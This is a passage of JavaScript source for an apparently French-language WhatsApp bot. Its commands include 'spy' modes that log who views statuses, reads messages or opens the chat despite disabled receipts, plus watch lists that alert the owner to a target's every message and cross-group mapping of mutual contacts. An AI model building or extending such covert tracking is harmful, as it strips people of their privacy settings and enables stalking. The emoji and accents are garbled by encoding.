        
        if (spyData.presenceDetected && spyData.presenceDetected.length > 0) {
          const last3 = spyData.presenceDetected.slice(-3).reverse();
          lastPresences = last3.map(p => {
            const name = p.name || "Inconnu";
            const actionEmoji = p.action === "composing" ? "âœï¸" : p.action === "recording" ? "ðŸŽ¤" : "ðŸ‘ï¸";
            return `â€¢ ${actionEmoji} ${name} (${formatNum(p.number)})`;
          }).join("\n");
        }
        
        return send(`ðŸ•µï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
      *MODE ESPION*
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ðŸ“Š *STATISTIQUES:*
ðŸ‘ï¸ *Vues statuts:* ${statusCount} (${uniqueStatusViewers} personnes)
ðŸ“– *Messages lus:* ${readCount} (${uniqueReadersCount} personnes)
â†©ï¸ *RÃ©ponses reÃ§ues:* ${repliesCount}
âœï¸ *PrÃ©sences dÃ©tectÃ©es:* ${presenceCount} (${uniquePresenceCount} personnes)

${lastViewers ? `ðŸ” *DerniÃ¨res vues statuts:*\n${lastViewers}\n` : ""}
${lastReaders ? `ðŸ“– *DerniÃ¨res lectures confirmÃ©es:*\n${lastReaders}\n` : ""}
${lastPresences ? `âœï¸ *Derniers actifs dans ton chat:*\n${lastPresences}\n` : ""}
âš™ï¸ *Ã‰tat actuel:*
â€¢ Spy statuts: ${protectionState.spyStatusViews ? "âœ… ON" : "âŒ OFF"}
â€¢ Spy lectures: ${protectionState.spyReadReceipts ? "âœ… ON" : "âŒ OFF"}
â€¢ Spy rÃ©ponses: ${protectionState.spyReplies ? "âœ… ON" : "âŒ OFF"}
â€¢ Spy prÃ©sence: ${protectionState.spyPresence ? "âœ… ON" : "âŒ OFF"}

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ðŸ“‹ *COMMANDES:*
â€¢ \`.spy status\` â†’ Qui a vu tes statuts
â€¢ \`.spy messages\` â†’ Qui a lu tes messages
â€¢ \`.spy presence\` â†’ Qui a ouvert ton chat
â€¢ \`.spy on\` â†’ Activer tout
â€¢ \`.spy off\` â†’ DÃ©sactiver tout
â€¢ \`.spy clear\` â†’ Effacer historique

_DÃ©tecte quand quelqu'un entre dans ta discussion mÃªme avec vues dÃ©sactivÃ©es!_`);
      }
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ” MODE & PERMISSIONS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "mode": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      const param = args?.toLowerCase();
      
      if (param === "public") {
        config.MODE = "public";
        return send(`ðŸŒ *Mode PUBLIC activÃ©!*

âœ… Tout le monde peut utiliser le bot selon son niveau:
â€¢ ðŸ‘‘ *Owner:* AccÃ¨s total
â€¢ ðŸ›¡ï¸ *Sudo:* Commandes admin
â€¢ âœ… *ApprouvÃ©:* IA, downloads, jeux
â€¢ ðŸ‘¤ *Public:* Menu, ping, sticker

ðŸ’¡ Utilise \`.approve @user\` pour donner plus d'accÃ¨s.`);
      } else if (param === "private") {
        config.MODE = "private";
        return send(`ðŸ”’ *Mode PRIVATE activÃ©!*

â›” Seuls l'Owner et les Sudos peuvent utiliser le bot.

ðŸ’¡ Utilise \`.mode public\` pour permettre l'accÃ¨s aux autres.`);
      } else {
        return send(`ðŸ” *Mode actuel: ${config.MODE.toUpperCase()}*

*Usage:* \`.mode public\` ou \`.mode private\`

â€¢ *Public:* Tout le monde selon son niveau
â€¢ *Private:* Owner et Sudo uniquement`);
      }
    }

    case "permissions":
    case "myaccess":
    case "mylevel": {
      // Cette commande est accessible Ã  tous
      const approvedList = db.getApprovedList();
      const userNum = senderNumber;
      
      let level = "ðŸ‘¤ *PUBLIC*";
      let description = "Tu peux utiliser les commandes de base (menu, ping, sticker, info).";
      let commands = "`.menu`, `.ping`, `.sticker`, `.info`";
      
      if (isOwner) {
        level = "ðŸ‘‘ *OWNER*";
        description = "Tu es le PROPRIÃ‰TAIRE du bot. Tu as accÃ¨s Ã  TOUTES les commandes!";
        commands = "Toutes les commandes sans restriction.";
      } else if (isSudo) {
        level = "ðŸ›¡ï¸ *SUDO*";
        description = "Tu es administrateur du bot. Tu as accÃ¨s aux commandes de gestion.";
        commands = "Gestion groupe, kick, ban, protections, + commandes approuvÃ©s.";
      } else if (db.isApproved(userNum)) {
        level = "âœ… *APPROUVÃ‰*";
        description = "Tu es approuvÃ© par l'owner. Tu as accÃ¨s aux fonctionnalitÃ©s avancÃ©es.";
        commands = "IA (GPT, DALL-E), tÃ©lÃ©chargements, jeux, conversions, + commandes publiques.";
      }
      
      return send(`â•­â”â”â” ðŸ” *TON NIVEAU D'ACCÃˆS* â”â”â”â•®
â”ƒ
â”ƒ ${level}
â”ƒ
â”ƒ ðŸ“‹ *Description:*
â”ƒ ${description}
â”ƒ
â”ƒ ðŸŽ¯ *Commandes disponibles:*
â”ƒ ${commands}
â”ƒ
â•°â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•¯

ðŸ“Š *HiÃ©rarchie du bot:*
â€¢ ðŸ‘‘ Owner â†’ AccÃ¨s total
â€¢ ðŸ›¡ï¸ Sudo â†’ Admin du bot
â€¢ âœ… ApprouvÃ© â†’ AccÃ¨s avancÃ©
â€¢ ðŸ‘¤ Public â†’ AccÃ¨s basique

${!isOwner && !isSudo && !db.isApproved(userNum) ? "\nðŸ’¡ *Tip:* Demande Ã  l'owner de t'approuver pour plus d'accÃ¨s!" : ""}`);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸš« BLOCAGE WHATSAPP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "block":
    case "bloquer": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let targetNumber = args?.replace(/[^0-9]/g, "");
      if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
      if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
      
      if (!targetNumber || targetNumber.length < 10) {
        return send(`âŒ *Usage:* .block [numÃ©ro]\n\nðŸ“± *Exemples:*\nâ€¢ .block 22550252467\nâ€¢ .block @mention\nâ€¢ RÃ©ponds Ã  un message avec .block`);
      }
      
      try {
        const targetJid = targetNumber + "@s.whatsapp.net";
        await hani.updateBlockStatus(targetJid, "block");
        return send(`âœ… *BloquÃ© avec succÃ¨s!*\n\nðŸ“± ${formatPhoneNumber(targetNumber)}\n\nðŸš« Cette personne ne peut plus:\nâ€¢ Te voir en ligne\nâ€¢ Voir ta photo de profil\nâ€¢ T'envoyer de messages\nâ€¢ Voir tes statuts`);
      } catch (e) {
        return send("âŒ Erreur: " + e.message);
      }
    }

    case "unblock":
    case "debloquer": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let targetNumber = args?.replace(/[^0-9]/g, "");
      if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
      if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
      
      if (!targetNumber || targetNumber.length < 10) {
        return send(`âŒ *Usage:* .unblock [numÃ©ro]\n\nðŸ“± *Exemples:*\nâ€¢ .unblock 22550252467\nâ€¢ .unblock @mention`);
      }
      
      try {
        const targetJid = targetNumber + "@s.whatsapp.net";
        await hani.updateBlockStatus(targetJid, "unblock");
        return send(`âœ… *DÃ©bloquÃ© avec succÃ¨s!*\n\nðŸ“± ${formatPhoneNumber(targetNumber)}`);
      } catch (e) {
        return send("âŒ Erreur: " + e.message);
      }
    }

    case "blocklist":
    case "listblock":
    case "blocked": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      try {
        const blockedList = await hani.fetchBlocklist();
        
        if (!blockedList || blockedList.length === 0) {
          return send("ðŸ“­ Aucun contact bloquÃ©.");
        }
        
        let list = `ðŸš« *CONTACTS BLOQUÃ‰S (${blockedList.length})*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
        
        for (let i = 0; i < blockedList.length; i++) {
          const jid = blockedList[i];
          const num = jid.split("@")[0];
          list += `${i + 1}. ${formatPhoneNumber(num)}\n`;
        }
        
        list += `\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\nðŸ’¡ Utilise .unblock [numÃ©ro] pour dÃ©bloquer`;
        
        return send(list);
      } catch (e) {
        return send("âŒ Erreur: " + e.message);
      }
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ“‡ GESTION DES CONTACTS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "contacts":
    case "contactlist":
    case "allcontacts": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const allContacts = getAllContacts();
      
      if (allContacts.length === 0) {
        return send("ðŸ“­ Aucun contact enregistrÃ©.\n\nLes contacts sont enregistrÃ©s automatiquement quand ils t'envoient des messages.");
      }
      
      // Trier par dernier message
      allContacts.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
      
      let list = `ðŸ“‡ *CONTACTS ENREGISTRÃ‰S (${allContacts.length})*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
      
      const maxShow = 30;
      for (let i = 0; i < Math.min(allContacts.length, maxShow); i++) {
        const c = allContacts[i];
        list += `${i + 1}. *${c.name}*\n`;
        list += `   ðŸ“± ${c.formattedNumber}\n`;
        list += `   ðŸ’¬ ${c.messageCount || 0} msg\n`;
        list += `   ðŸ• ${c.lastSeen}\n\n`;
      }
      
      if (allContacts.length > maxShow) {
        list += `\n... et ${allContacts.length - maxShow} autres contacts`;
      }
      
      list += `\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\nðŸ’¡ .searchcontact [nom] pour chercher`;
      
      return send(list);
    }

    case "searchcontact":
    case "findcontact": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      if (!args) {
        return send(`âŒ *Usage:* .searchcontact [nom ou numÃ©ro]\n\nðŸ“± Exemples:\nâ€¢ .searchcontact Jean\nâ€¢ .searchcontact 0150252467`);
      }
      
      const results = searchContacts(args);
      
      if (results.length === 0) {
        return send(`âŒ Aucun contact trouvÃ© pour "${args}"`);
      }
      
      let list = `ðŸ” *RÃ‰SULTATS POUR "${args}"*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
      
      for (let i = 0; i < Math.min(results.length, 15); i++) {
        const c = results[i];
        list += `${i + 1}. *${c.name}*\n`;
        list += `   ðŸ“± ${c.formattedNumber}\n`;
        list += `   ðŸ’¬ ${c.messageCount || 0} messages\n`;
        list += `   ðŸ“… Vu: ${c.lastSeen}\n\n`;
      }
      
      if (results.length > 15) {
        list += `\n... et ${results.length - 15} autres rÃ©sultats`;
      }
      
      return send(list);
    }

    case "contactinfo":
    case "infocontact": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let targetNumber = args?.replace(/[^0-9]/g, "");
      if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
      if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
      
      if (!targetNumber) {
        return send(`âŒ *Usage:* .contactinfo [numÃ©ro ou @mention]`);
      }
      
      const contact = getContact(targetNumber);
      
      if (!contact) {
        return send(`âŒ Contact non trouvÃ©: ${formatPhoneNumber(targetNumber)}\n\nCe contact ne t'a jamais envoyÃ© de message.`);
      }
      
      // Essayer de rÃ©cupÃ©rer la photo de profil
      let profilePic = null;
      try {
        profilePic = await hani.profilePictureUrl(contact.jid, "image");
      } catch (e) {}
      
      const info = `
ðŸ“‡ *FICHE CONTACT*
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

ðŸ‘¤ *Nom:* ${contact.name}
ðŸ“± *NumÃ©ro:* ${contact.formattedNumber}
ðŸ†” *JID:* ${contact.jid}

ðŸ“Š *Statistiques:*
â”ƒ ðŸ’¬ Messages: ${contact.messageCount || 0}
â”ƒ ðŸ“… Premier contact: ${contact.firstSeen}
â”ƒ ðŸ• Dernier contact: ${contact.lastSeen}
â”ƒ ðŸ“ DerniÃ¨re activitÃ©: ${contact.lastActivity || "Inconnu"}

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
      `.trim();
      
      if (profilePic) {
        try {
          await hani.sendMessage(from, { image: { url: profilePic }, caption: info });
          return;
        } catch (e) {}
      }
      
      return send(info);
    }

    case "privacy":
    case "confidentialite": {
      const privacyHelp = `
ðŸ”’ *PARAMÃˆTRES DE CONFIDENTIALITÃ‰*
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

ðŸ“± *Dans WhatsApp â†’ ParamÃ¨tres â†’ ConfidentialitÃ©:*

â”ƒ ðŸ“¸ *Photo de profil:*
â”ƒ â†’ Tout le monde / Mes contacts / Personne
â”ƒ
â”ƒ ðŸ‘ï¸ *DerniÃ¨re connexion:*
â”ƒ â†’ Tout le monde / Mes contacts / Personne
â”ƒ
â”ƒ âœ… *Confirmations de lecture:*
â”ƒ â†’ Activer / DÃ©sactiver
â”ƒ
â”ƒ ðŸ“ *Infos (Ã€ propos):*
â”ƒ â†’ Tout le monde / Mes contacts / Personne
â”ƒ
â”ƒ ðŸ‘¥ *Groupes:*
â”ƒ â†’ Tout le monde / Mes contacts / Mes contacts sauf...
â”ƒ
â”ƒ ðŸ“ *Localisation en direct:*
â”ƒ â†’ Personne / Partager avec...

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ðŸ’¡ *Commandes du bot:*
â€¢ .block [nÂ°] - Bloquer un contact
â€¢ .unblock [nÂ°] - DÃ©bloquer
â€¢ .blocklist - Voir les bloquÃ©s

âš ï¸ *Note:* Tu ne peux PAS masquer ton numÃ©ro.
C'est ton identifiant WhatsApp.
      `.trim();
      
      return send(privacyHelp);
    }

    case "broadcast":
    case "bc": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      if (!args) return send("âŒ Donne un message Ã  diffuser.");
      
      // Diffuser dans tous les groupes
      let sent = 0;
      for (const groupJid of Object.keys(db.data.groups)) {
        try {
          await hani.sendMessage(groupJid, { text: `ðŸ“¢ *Annonce HANI-MD*\n\n${args}` });
          sent++;
          await delay(1000);
        } catch (e) {}
      }
      return send(`âœ… Message diffusÃ© dans ${sent} groupes.`);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ•µï¸ SURVEILLANCE / SPY â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "watch":
    case "spy":
    case "surveiller": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      // Ajouter un numÃ©ro Ã  surveiller
      let targetNumber = args?.replace(/[^0-9]/g, "");
      if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
      if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
      
      if (!targetNumber || targetNumber.length < 8) {
        return send(`âŒ *Usage:* .spy [numÃ©ro]\n\nðŸ“± *Exemples:*\nâ€¢ .spy 22550252467\nâ€¢ .spy +225 01 50 25 24 67\nâ€¢ .spy @mention\n\nðŸ’¡ Le numÃ©ro doit Ãªtre au format international sans le +`);
      }
      
      // VÃ©rifier si dÃ©jÃ  surveillÃ©
      if (watchList.has(targetNumber)) {
        return send(`âš ï¸ Ce numÃ©ro est dÃ©jÃ  surveillÃ©!\n\nðŸ“± ${formatPhoneNumber(targetNumber)}`);
      }
      
      watchList.add(targetNumber);
      
      console.log(`[SPY] Surveillance ajoutÃ©e: ${targetNumber}`);
      console.log(`[SPY] Liste actuelle: ${[...watchList].join(", ")}`);
      
      let response = `ðŸ•µï¸ *SURVEILLANCE ACTIVÃ‰E*\n`;
      response += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
      response += `ðŸ“± *NumÃ©ro:* ${formatPhoneNumber(targetNumber)}\n`;
      response += `ðŸ”¢ *ID interne:* ${targetNumber}\n\n`;
      response += `âœ… Tu recevras une alerte Ã  chaque:\n`;
      response += `   â€¢ Message texte\n`;
      response += `   â€¢ Photo/VidÃ©o envoyÃ©e\n`;
      response += `   â€¢ Audio/Document\n\n`;
      response += `ðŸ“Š *SurveillÃ©s:* ${watchList.size} personne(s)\n\n`;
      response += `ðŸ’¡ Commandes:\n`;
      response += `   â€¢ .spylist - Voir la liste\n`;
      response += `   â€¢ .unspy ${targetNumber} - ArrÃªter`;
      
      return send(response);
    }

    case "unwatch":
    case "unspy": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let targetNumber = args?.replace(/[^0-9]/g, "");
      if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
      
      if (!targetNumber) {
        return send(`âŒ *Usage:* .unspy [numÃ©ro]\n\nðŸ“± Liste actuelle: ${watchList.size} surveillÃ©(s)\nUtilise .spylist pour voir`);
      }
      
      if (!watchList.has(targetNumber)) {
        return send(`âš ï¸ Ce numÃ©ro n'est pas surveillÃ©.\n\nUtilise .spylist pour voir la liste.`);
      }
      
      watchList.delete(targetNumber);
      console.log(`[SPY] Surveillance retirÃ©e: ${targetNumber}`);
      
      return send(`âœ… *Surveillance dÃ©sactivÃ©e*\n\nðŸ“± ${formatPhoneNumber(targetNumber)}\n\nðŸ“Š Reste: ${watchList.size} surveillÃ©(s)`);
    }

    case "watchlist":
    case "spylist": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      if (watchList.size === 0) {
        return send(`ðŸ“­ *Aucune surveillance active*\n\nðŸ’¡ Utilise .spy [numÃ©ro] pour commencer\n\nExemple: .spy 22550252467`);
      }
      
      let list = `ðŸ•µï¸ *NUMÃ‰ROS SURVEILLÃ‰S*\n`;
      list += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
      
      let i = 1;
      for (const num of watchList) {
        const tracked = activityTracker.get(num);
        list += `*${i}.* ${formatPhoneNumber(num)}\n`;
        if (tracked) {
          list += `   ðŸ‘¤ ${tracked.name}\n`;
          list += `   ðŸ’¬ ${tracked.messageCount} msg(s)\n`;
          list += `   ðŸ• Vu: ${tracked.lastSeen}\n`;
        } else {
          list += `   â³ En attente d'activitÃ©...\n`;
        }
        list += `\n`;
        i++;
      }
      
      list += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
      list += `ðŸ“Š *Total:* ${watchList.size} surveillance(s)`;
      
      return send(list);
    }

    case "testspy":
    case "spytest": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let info = `ðŸ•µï¸ *TEST SURVEILLANCE*\n`;
      info += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
      info += `ðŸ“Š *SurveillÃ©s:* ${watchList.size}\n`;
      info += `ðŸ“‹ *Liste:*\n`;
      
      for (const num of watchList) {
        info += `   â€¢ ${num}\n`;
      }
      
      info += `\nðŸ” *Dernier expÃ©diteur dÃ©tectÃ©:*\n`;
      info += `   ${sender?.split("@")[0] || "Aucun"}\n`;
      
      return send(info);
    }

    case "activity":
    case "activite":
    case "track": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let targetNumber = args?.replace(/[^0-9]/g, "");
      if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
      if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
      
      if (!targetNumber) {
        // Afficher les top utilisateurs actifs
        if (activityTracker.size === 0) return send("ðŸ“­ Aucune activitÃ© enregistrÃ©e.");
        
        const sorted = [...activityTracker.values()]
          .sort((a, b) => b.messageCount - a.messageCount)
          .slice(0, 15);
        
        let list = "ðŸ•µï¸ *ActivitÃ© rÃ©cente (Top 15)*\n\n";
        sorted.forEach((user, i) => {
          list += `${i + 1}. *${user.name}*\n`;
          list += `   ðŸ“± ${formatPhoneNumber(user.number)}\n`;
          list += `   ðŸ’¬ ${user.messageCount} msgs\n`;
          list += `   ðŸ• Vu: ${user.lastSeen}\n\n`;
        });
        return send(list);
      }
      
      // Afficher l'activitÃ© d'un utilisateur spÃ©cifique
      const tracker = activityTracker.get(targetNumber);
      if (!tracker) return send(`âŒ Aucune activitÃ© enregistrÃ©e pour ${formatPhoneNumber(targetNumber)}`);
      
      let text = `ðŸ•µï¸ *ActivitÃ© de ${tracker.name}*\n`;
      text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
      text += `ðŸ“± *NumÃ©ro:* ${formatPhoneNumber(tracker.number)}\n`;
      text += `ðŸ“… *1Ã¨re vue:* ${tracker.firstSeen}\n`;
      text += `ðŸ• *DerniÃ¨re vue:* ${tracker.lastSeen}\n`;
      text += `ðŸ’¬ *Messages:* ${tracker.messageCount}\n`;
      
      // Groupes oÃ¹ l'utilisateur est actif
      if (tracker.chats.size > 0) {
        text += `\nðŸ˜ï¸ *Actif dans ${tracker.chats.size} groupe(s):*\n`;
        let j = 1;
        for (const chat of tracker.chats) {
          if (j <= 5) {
            text += `   ${j}. ${chat.split("@")[0]}\n`;
          }
          j++;
        }
        if (tracker.chats.size > 5) text += `   ... et ${tracker.chats.size - 5} autres\n`;
      }
      
      // DerniÃ¨res activitÃ©s
      if (tracker.activities.length > 0) {
        text += `\nðŸ“Š *DerniÃ¨res activitÃ©s:*\n`;
        tracker.activities.slice(-5).forEach(act => {
          text += `   â€¢ ${act.type?.replace("Message", "")} - ${act.time}\n`;
        });
      }
      
      return send(text);
    }

    case "clearactivity":
    case "cleartrack": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      activityTracker.clear();
      return send("âœ… Historique d'activitÃ© effacÃ©.");
    }

    case "tracklist":
    case "spiedlist": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      if (watchList.size === 0) {
        return send("ðŸ“­ Aucun utilisateur sous surveillance.\n\nUtilise `.spy @user` pour commencer.");
      }
      
      let list = "ðŸ•µï¸ *Utilisateurs sous surveillance*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n";
      let i = 1;
      for (const num of watchList) {
        const tracked = activityTracker.get(num);
        list += `${i}. ðŸ“± ${formatPhoneNumber(num)}\n`;
        if (tracked) {
          list += `   ðŸ‘¤ ${tracked.name}\n`;
          list += `   ðŸ’¬ ${tracked.messageCount} msgs\n`;
          list += `   ðŸ• ${tracked.lastSeen}\n`;
        } else {
          list += `   â³ En attente d'activitÃ©...\n`;
        }
        list += "\n";
        i++;
      }
      
      list += `ðŸ“Š *Total:* ${watchList.size} surveillance(s) active(s)`;
      return send(list);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ”— CONTACTS EN COMMUN â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "communs":
    case "common":
    case "commoncontacts":
    case "mutual":
    case "quiconnait": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let targetNumber = args?.replace(/[^0-9]/g, "");
      if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
      if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
      
      await send("ðŸ” *Analyse des contacts en commun en cours...*\nScanning de tous vos groupes...");
      
      try {
        // RÃ©cupÃ©rer tous les groupes
        const groups = await hani.groupFetchAllParticipating();
        const groupIds = Object.keys(groups);
        
        if (groupIds.length === 0) {
          return send("âŒ Aucun groupe trouvÃ©.");
        }
        
        // Map: numÃ©ro â†’ { name, groups: [groupNames], inGroupsWith: Set(numÃ©ros) }
        const contactMap = new Map();
        const botNumber = hani.user?.id?.split(":")[0]?.split("@")[0];
        
        // Analyser chaque groupe
        for (const groupId of groupIds) {
          const group = groups[groupId];
          const groupName = group.subject || "Groupe sans nom";
          const participants = group.participants || [];
          
          // Ajouter chaque participant
          for (const p of participants) {
            const num = p.id?.split("@")[0]?.split(":")[0];
            if (!num || isLID(num)) continue;
            
            if (!contactMap.has(num)) {
              contactMap.set(num, {
                name: p.notify || p.name || "Inconnu",
                groups: [],
                inGroupsWith: new Set(),
                isAdmin: false
              });
            }
            
            const contact = contactMap.get(num);
            contact.groups.push(groupName);
            if (p.admin) contact.isAdmin = true;
            
            // Ajouter les autres participants comme "contacts en commun"
            for (const other of participants) {
              const otherNum = other.id?.split("@")[0]?.split(":")[0];
              if (otherNum && otherNum !== num && !isLID(otherNum)) {
                contact.inGroupsWith.add(otherNum);
              }
            }
          }
        }
        
        // Si un numÃ©ro cible est spÃ©cifiÃ©
        if (targetNumber) {
          const targetContact = contactMap.get(targetNumber);
          
          if (!targetContact) {
            return send(`âŒ *${formatPhoneNumber(targetNumber)}* n'est dans aucun de vos groupes.`);
          }
          
          // Trouver les contacts en commun avec toi
          const myContacts = contactMap.get(botNumber)?.inGroupsWith || new Set();
          const targetContacts = targetContact.inGroupsWith;
          
          // Contacts en commun entre toi et la cible
          const commonWithTarget = [...targetContacts].filter(n => myContacts.has(n) && n !== botNumber);
          
          let text = `ðŸ”— *CONTACTS EN COMMUN*\n`;
          text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
          text += `ðŸŽ¯ *Cible:* ${targetContact.name}\n`;
          text += `ðŸ“± *NumÃ©ro:* ${formatPhoneNumber(targetNumber)}\n`;
          text += `ðŸ‘‘ *Admin:* ${targetContact.isAdmin ? "Oui" : "Non"}\n\n`;
          
          text += `ðŸ˜ï¸ *Groupes en commun avec toi:*\n`;
          const commonGroups = targetContact.groups.filter(g => {
            // VÃ©rifier si toi aussi tu es dans ce groupe
            for (const [num, c] of contactMap) {
              if (num === botNumber && c.groups.includes(g)) return true;
            }
            return false;
          });
          
          if (commonGroups.length > 0) {
            commonGroups.slice(0, 10).forEach((g, i) => {
              text += `   ${i + 1}. ${g}\n`;
            });
            if (commonGroups.length > 10) text += `   ... et ${commonGroups.length - 10} autres\n`;
          } else {
            text += `   Aucun groupe en commun\n`;
          }
          
          text += `\nðŸ‘¥ *Contacts mutuels (${commonWithTarget.length}):*\n`;
          if (commonWithTarget.length > 0) {
            commonWithTarget.slice(0, 15).forEach((num, i) => {
              const c = contactMap.get(num);
              text += `   ${i + 1}. ${c?.name || "Inconnu"} (${formatPhoneNumber(num)})\n`;
            });
            if (commonWithTarget.length > 15) text += `   ... et ${commonWithTarget.length - 15} autres\n`;
          } else {
            text += `   Aucun contact mutuel trouvÃ©\n`;
          }
          
          text += `\nðŸ“Š *Stats:*\n`;
          text += `   â€¢ Dans ${targetContact.groups.length} groupe(s)\n`;
          text += `   â€¢ ConnaÃ®t ${targetContact.inGroupsWith.size} personne(s)\n`;
          
          return send(text);
        }
        
        // Sans cible: afficher les personnes les plus "connectÃ©es"
        const sorted = [...contactMap.entries()]
          .filter(([num]) => num !== botNumber && !isLID(num))
          .sort((a, b) => b[1].inGroupsWith.size - a[1].inGroupsWith.size)
          .slice(0, 20);
        
        let text = `ðŸ”— *TOP CONTACTS LES PLUS CONNECTÃ‰S*\n`;
        text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
        text += `ðŸ“Š *${groupIds.length} groupes analysÃ©s*\n`;
        text += `ðŸ‘¥ *${contactMap.size} contacts trouvÃ©s*\n\n`;
        
        sorted.forEach(([num, contact], i) => {
          const emoji = i < 3 ? ["ðŸ¥‡", "ðŸ¥ˆ", "ðŸ¥‰"][i] : `${i + 1}.`;
          text += `${emoji} *${contact.name}*\n`;
          text += `   ðŸ“± ${formatPhoneNumber(num)}\n`;
          text += `   ðŸ”— ConnaÃ®t ${contact.inGroupsWith.size} personnes\n`;
          text += `   ðŸ˜ï¸ Dans ${contact.groups.length} groupe(s)\n\n`;
        });
        
        text += `ðŸ’¡ *Utilise* \`.communs @user\` *pour voir les dÃ©tails d'un contact*`;
        
        return send(text);
        
      } catch (error) {
        console.error("[COMMUNS] Erreur:", error);
        return send(`âŒ Erreur: ${error.message}`);
      }
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ” QUI A MON NUMÃ‰RO â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "quiamon":
    case "whohasme":
    case "whosaveme": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      await send("ðŸ” *Recherche de qui a ton numÃ©ro...*");
      
      try {
        const groups = await hani.groupFetchAllParticipating();
        const groupIds = Object.keys(groups);
        const botNumber = hani.user?.id?.split(":")[0]?.split("@")[0];
        
        // Personnes qui sont dans les mÃªmes groupes que toi
        const peopleWhoKnowMe = new Map();
        
        for (const groupId of groupIds) {
          const group = groups[groupId];
          const groupName = group.subject || "Groupe sans nom";
          const participants = group.participants || [];
          
          // VÃ©rifier si le bot est dans ce groupe
          const botInGroup = participants.some(p => {
            const num = p.id?.split("@")[0]?.split(":")[0];
            return num === botNumber;
          });
          
          if (!botInGroup) continue;
          
          // Toutes les personnes de ce groupe ont potentiellement ton numÃ©ro
          for (const p of participants) {
            const num = p.id?.split("@")[0]?.split(":")[0];
            if (!num || num === botNumber || isLID(num)) continue;
            
            if (!peopleWhoKnowMe.has(num)) {
              peopleWhoKnowMe.set(num, {
                name: p.notify || p.name || "Inconnu",
